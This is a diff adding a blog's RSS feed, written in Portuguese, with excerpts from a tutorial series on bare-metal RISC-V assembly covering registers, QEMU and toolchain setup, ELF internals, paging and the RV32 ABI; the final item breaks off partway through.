@@ -1,0 +1,1382 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Marcos Azevedo (aka psylinux)</title><link>https://psylinux.github.io/pt/</link><description>Recent content on Marcos Azevedo (aka psylinux)</description><generator>Hugo</generator><language>pt-br</language><copyright>2025 Marcos Azevedo</copyright><lastBuildDate>Tue, 27 Jan 2026 07:43:49 +0000</lastBuildDate><atom:link href="https://psylinux.github.io/pt/index.xml" rel="self" type="application/rss+xml"/><item><title>Prefácio</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/01-preface/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/01-preface/</guid><description>&lt;h2 id="1-propósito-e-escopo">1. Propósito e escopo&lt;/h2>
+&lt;p>Este livro é uma introdução prática e bare-metal à programação em assembly RISC-V. Você vai construir e executar pequenos programas RV32 no &lt;strong>modo sistema do QEMU&lt;/strong> usando a toolchain cross &lt;strong>&lt;code>riscv64-unknown-elf-gcc&lt;/code>&lt;/strong>. Não há &lt;strong>hardware real&lt;/strong> e &lt;strong>não há libc&lt;/strong> disponível, então todos os exemplos permanecem freestanding e imprimem pela UART &lt;code>virt&lt;/code> do QEMU.&lt;/p>
+&lt;h2 id="2-para-quem-é-este-material">2. Para quem é este material&lt;/h2>
+&lt;ul>
+&lt;li>Leitores com experiência básica em programação que querem entender assembly e fluxos bare-metal.&lt;/li>
+&lt;li>Engenheiros que querem um fluxo repetível, com emulador primeiro, para aprender e depurar RISC-V.&lt;/li>
+&lt;/ul>
+&lt;h2 id="3-como-usar-este-livro">3. Como usar este livro&lt;/h2>
+&lt;ul>
+&lt;li>Todo bloco de código que nomeia um arquivo vive no &lt;a href="https://github.com/psylinux/riscv-experiments">GitHub RISC-V Experiments Repository&lt;/a>.&lt;/li>
+&lt;li>Cada capítulo termina com exercícios e um pequeno resumo.&lt;/li>
+&lt;li>Todos os comandos de build usam &lt;code>riscv64-unknown-elf-gcc&lt;/code> e rodam em &lt;code>qemu-system-riscv32&lt;/code>. Veja o capítulo &lt;a href="https://psylinux.github.io/pt/series/experimenting-with-risc-v/04-setup-toolchain/">Configurando a toolchain&lt;/a> para detalhes.&lt;/li>
+&lt;/ul>
+&lt;h2 id="4-contato">4. Contato&lt;/h2>
+&lt;p>Feedback e perguntas são bem-vindos. Faça um comentário, abra uma issue ou um pull request no repositório e inclua o nome do capítulo e a seção para facilitar a reprodução.&lt;/p></description></item><item><title>Introdução</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/02-introduction/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/02-introduction/</guid><description>&lt;h2 id="1-o-que-é-risc-v">1. O que é RISC-V?&lt;/h2>
+&lt;p>RISC-V é uma arquitetura de conjunto de instruções (ISA) aberta. Ela é pequena, especificada com clareza e projetada para ser estendida. Isso a torna ideal para aprender como CPUs executam instruções e como o software começa sem um sistema operacional.&lt;/p>
+&lt;h2 id="2-por-que-bare-metal">2. Por que bare-metal?&lt;/h2>
+&lt;p>Programação bare-metal dá controle direto sobre o processador, o mapa de memória e os periféricos. Também força você a entender o que o compilador, o linker e o código de inicialização estão fazendo, o que torna depuração e engenharia reversa muito mais fáceis depois.&lt;/p></description></item><item><title>Visão geral da arquitetura RISC-V</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/03-architecture-overview/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/03-architecture-overview/</guid><description>&lt;h2 id="1-ideias-centrais">1. Ideias centrais&lt;/h2>
+&lt;p>RV32I é a ISA base inteira de 32 bits. Ela usa 32 registradores de propósito geral (&lt;code>x0&lt;/code>..&lt;code>x31&lt;/code>) e um modelo load/store. Apenas loads e stores tocam a memória; a aritmética fica nos registradores.&lt;/p>
+&lt;h2 id="2-registradores-em-um-relance">2. Registradores em um relance&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>x0 = zero (sempre 0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x1 = ra (return address)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x2 = sp (stack pointer)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x3 = gp (global pointer)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x4 = tp (thread pointer)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x5..x7 = temporários (t0..t2)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x8..x9 = salvos (s0/fp, s1)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x10..x17 = args/return (a0..a7)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x18..x27 = salvos (s2..s11)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x28..x31 = temporários (t3..t6)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="3-formatos-de-instrução">3. Formatos de instrução&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-mermaid" data-lang="mermaid">flowchart LR
+ I[&amp;#34;Immediate&amp;#34;] --&amp;gt;|addi/lw/jalr| I1[&amp;#34;imm[11:0] rs1 funct3 rd opcode&amp;#34;]
+ R[&amp;#34;Register&amp;#34;] --&amp;gt;|add/sub| R1[&amp;#34;funct7 rs2 rs1 funct3 rd opcode&amp;#34;]
+ S[&amp;#34;Store&amp;#34;] --&amp;gt;|sw/sb| S1[&amp;#34;imm[11:5] rs2 rs1 funct3 imm[4:0] opcode&amp;#34;]
+ B[&amp;#34;Branch&amp;#34;] --&amp;gt;|beq/bne| B1[&amp;#34;imm rs2 rs1 funct3 imm opcode&amp;#34;]
+&lt;/code>&lt;/pre>&lt;h2 id="4-recursos-adicionais">4. Recursos adicionais&lt;/h2>
+&lt;ul>
+&lt;li>Para mais detalhes, veja a &lt;a href="https://github.com/riscv/riscv-isa-manual/releases">RISC-V spec&lt;/a>.&lt;/li>
+&lt;li>Outro recurso útil e conciso é o &lt;a href="https://github.com/psylinux/riscv-experiments/blob/main/docs/riscv-card.pdf">RISC-V Card&lt;/a>.&lt;/li>
+&lt;/ul>
+&lt;h2 id="5-mapa-de-memória-no-qemu-virt">5. Mapa de memória no QEMU virt&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>0x8000_0000 RAM &lt;span style="color:#f92672">(&lt;/span>colocamos código + dados aqui&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x1000_0000 UART0 &lt;span style="color:#f92672">(&lt;/span>MMIO&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="6-exercícios">6. Exercícios&lt;/h2>
+&lt;ol>
+&lt;li>Identifique quais registradores são caller-saved vs callee-saved.&lt;/li>
+&lt;li>Procure um formato de instrução na spec do &lt;a href="https://github.com/psylinux/riscv-experiments/blob/main/docs/riscv-card.pdf">RISC-V Card&lt;/a> e mapeie cada campo pelo nome.&lt;/li>
+&lt;/ol>
+&lt;h2 id="7-resumo">7. Resumo&lt;/h2>
+&lt;ul>
+&lt;li>O RV32I fornece uma ISA base pequena e limpa.&lt;/li>
+&lt;li>O banco de registradores é fixo e as convenções dão papéis aos registradores.&lt;/li>
+&lt;li>O QEMU &lt;code>virt&lt;/code> expõe um mapa simples de RAM + UART.&lt;/li>
+&lt;/ul></description></item><item><title>Configurando a toolchain e o QEMU</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/04-setup-toolchain/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/04-setup-toolchain/</guid><description>&lt;h2 id="1-tldr">1. TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Use &lt;strong>&lt;code>riscv64-unknown-elf-gcc&lt;/code>&lt;/strong> para todos os builds.&lt;/li>
+&lt;li>Rode programas com &lt;strong>&lt;code>qemu-system-riscv32&lt;/code>&lt;/strong> em modo sistema.&lt;/li>
+&lt;li>Não usamos libc; toda saída vai pela UART &lt;code>virt&lt;/code> do QEMU.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="2-antes-de-começar">2. Antes de começar&lt;/h2>
+&lt;p>Todos os arquivos-fonte estão disponíveis no &lt;a href="https://github.com/psylinux/riscv-experiments">GitHub RISC-V Experiments Repository&lt;/a>.&lt;/p>
+&lt;h2 id="3-ferramentas-necessárias">3. Ferramentas necessárias&lt;/h2>
+&lt;p>Precisamos do compilador cruzado GCC para RISC-V, QEMU, GDB e algumas ferramentas padrão de build.
+No Ubuntu 24.04 (ou sistemas baseados em Debian), instale com:&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sudo apt update
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt install build-essential &lt;span style="color:#ae81ff">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> gcc-riscv64-unknown-elf &lt;span style="color:#ae81ff">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> gdb-multiarch &lt;span style="color:#ae81ff">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> qemu-system-riscv32 &lt;span style="color:#ae81ff">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> binutils-riscv64-unknown-elf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;strong>&lt;code>gcc-riscv64-unknown-elf&lt;/code>&lt;/strong>: o cross-compiler para software bare-metal.&lt;/li>
+&lt;li>&lt;strong>&lt;code>qemu-system-riscv32&lt;/code>&lt;/strong>: emula um computador RISC-V de 32 bits.&lt;/li>
+&lt;li>&lt;strong>&lt;code>gdb-multiarch&lt;/code>&lt;/strong>: depurador que conversa com diferentes arquiteturas (como nosso alvo RISC-V).&lt;/li>
+&lt;li>&lt;strong>&lt;code>binutils-riscv64-unknown-elf&lt;/code>&lt;/strong>: fornece &lt;code>readelf&lt;/code>, &lt;code>objdump&lt;/code>, &lt;code>objcopy&lt;/code>, etc.&lt;/li>
+&lt;/ul>
+&lt;h3 id="31-instalar-o-pwndbg">3.1. Instalar o Pwndbg&lt;/h3>
+&lt;p>Pwndbg é um plug-in poderoso do GDB que fornece uma interface melhor para engenharia reversa e depuração. Ele será útil para inspecionar registradores e memória em capítulos posteriores.&lt;/p></description></item><item><title>Instruções básicas de assembly RISC-V</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/05-basic-assembly/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/05-basic-assembly/</guid><description>&lt;h2 id="1-objetivo">1. Objetivo&lt;/h2>
+&lt;p>Aprender as famílias centrais de instruções do RV32I e praticar com um pequeno programa escrito à mão.&lt;/p>
+&lt;h2 id="2-famílias-de-instruções">2. Famílias de instruções&lt;/h2>
+&lt;ul>
+&lt;li>&lt;strong>Aritmética&lt;/strong>: &lt;code>add&lt;/code>, &lt;code>addi&lt;/code>, &lt;code>sub&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Loads/stores&lt;/strong>: &lt;code>lw&lt;/code>, &lt;code>sw&lt;/code>, &lt;code>lb&lt;/code>, &lt;code>sb&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Branches&lt;/strong>: &lt;code>beq&lt;/code>, &lt;code>bne&lt;/code>, &lt;code>blt&lt;/code>, &lt;code>bge&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Jumps&lt;/strong>: &lt;code>jal&lt;/code>, &lt;code>jalr&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="3-exemplo-somar-dois-números-e-armazenar-o-resultado">3. Exemplo: somar dois números e armazenar o resultado&lt;/h2>
+&lt;p>Arquivo: &lt;code>src/basic_add.s&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>.section .text
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.globl _start
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>_start:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> li t0, &lt;span style="color:#ae81ff">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> li t1, &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add t2, t0, t1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> la t3, g_result
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sw t2, 0&lt;span style="color:#f92672">(&lt;/span>t3&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> j 1b
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.section .bss
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.align &lt;span style="color:#ae81ff">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g_result:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .word &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="4-linker-script-mínimo-e-por-que-isso-importa">4. Linker script mínimo (e por que isso importa)&lt;/h2>
+&lt;p>Quando você roda assembly bare-metal, não há sistema operacional nem runtime C para decidir onde o seu código e dados vivem na memória. O &lt;strong>C Runtime (CRT)&lt;/strong> é o código que roda antes do seu &lt;code>main()&lt;/code> e depois que ele termina.
+Ele prepara o ambiente de execução de um programa C: pilha, argumentos, variáveis globais, bibliotecas, e só então chama &lt;code>main()&lt;/code>.&lt;/p></description></item><item><title>Internals de ELF e Binutils: vendo o que o compilador produziu</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/06-elf-and-binutils/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/06-elf-and-binutils/</guid><description>&lt;h2 id="1-tldr">1. TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai aprender como um arquivo &lt;strong>ELF (Executable and Linkable Format)&lt;/strong> é estruturado e como essa estrutura mapeia para a &lt;strong>memória em runtime&lt;/strong>.&lt;/li>
+&lt;li>Vai praticar com &lt;code>readelf&lt;/code>, &lt;code>objdump&lt;/code>, &lt;code>nm&lt;/code>, &lt;code>objcopy&lt;/code>, &lt;code>xxd&lt;/code> e &lt;code>hexdump&lt;/code> para responder perguntas práticas:
+&lt;ul>
+&lt;li>“Qual é o entry point?”&lt;/li>
+&lt;li>“Onde fica esta função?”&lt;/li>
+&lt;li>“Quais bytes correspondem a esta instrução?”&lt;/li>
+&lt;li>“Por que este endereço aparece no disassembly, mas não no arquivo?”&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Vai construir um modelo mental de &lt;strong>seções vs segmentos&lt;/strong>, &lt;strong>símbolos&lt;/strong> e &lt;strong>relocações&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;p>Se você consegue ler a estrutura ELF com confiança, engenharia reversa e depuração ficam muito mais fáceis. Você para de chutar!&lt;/p></description></item><item><title>Memória, Paginação e a Ilusão do Hardware</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/07-memory-and-paging/</link><pubDate>Sat, 24 Jan 2026 06:20:00 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/07-memory-and-paging/</guid><description>&lt;p>No capítulo anterior, vimos algo curioso no &lt;code>readelf -l&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>LOAD ... RWE 0x1000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>E o seu linker script tinha esta instrução:&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>. = 0x80000000;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Por que &lt;code>0x1000&lt;/code>? Por que o hardware se importa? E o seu código &lt;em>realmente&lt;/em> vive em &lt;code>0x80000000&lt;/code> dentro do chip físico?
+Vamos levantar o véu de uma das ilusões mais importantes da ciência da computação: &lt;strong>Gerenciamento de Memória&lt;/strong>.&lt;/p></description></item><item><title>ABI do RV32 e Tipos de Dados em C: Tamanhos, Alinhamento e Layout</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/08-rv32-abi-c-types/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/08-rv32-abi-c-types/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai aprender as regras do &lt;strong>ABI RV32 ILP32 (Application Binary Interface)&lt;/strong> que fazem o C e o assembly &amp;ldquo;concordarem&amp;rdquo; sobre:
+&lt;ul>
+&lt;li>uso de registradores,&lt;/li>
+&lt;li>passagem de parâmetros,&lt;/li>
+&lt;li>valores de retorno,&lt;/li>
+&lt;li>alinhamento da pilha,&lt;/li>
+&lt;li>e layout de dados.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Você vai medir e verificar &lt;strong>tamanhos de tipos&lt;/strong>, &lt;strong>padding de structs&lt;/strong> e &lt;strong>endianness&lt;/strong> no RV32.&lt;/li>
+&lt;li>Você vai produzir pequenos experimentos que pode inspecionar tanto em C quanto em assembly.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>O ABI é o contrato. Se você violá-lo (mesmo sem querer), surgem “bugs estranhos” que parecem corrupção de pilha, ponteiros ruins ou travamentos aleatórios.&lt;/strong>&lt;/p></description></item><item><title>C → Assembly: Otimizações, Volatile e o que o compilador pode fazer</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/09-c-to-asm-optimizations-volatile/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/09-c-to-asm-optimizations-volatile/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai entender como o compilador transforma C em assembly e por que o mesmo C pode parecer totalmente diferente entre &lt;code>-O0&lt;/code> e &lt;code>-O2&lt;/code>.&lt;/li>
+&lt;li>Vai construir um modelo mental prático para:
+&lt;ul>
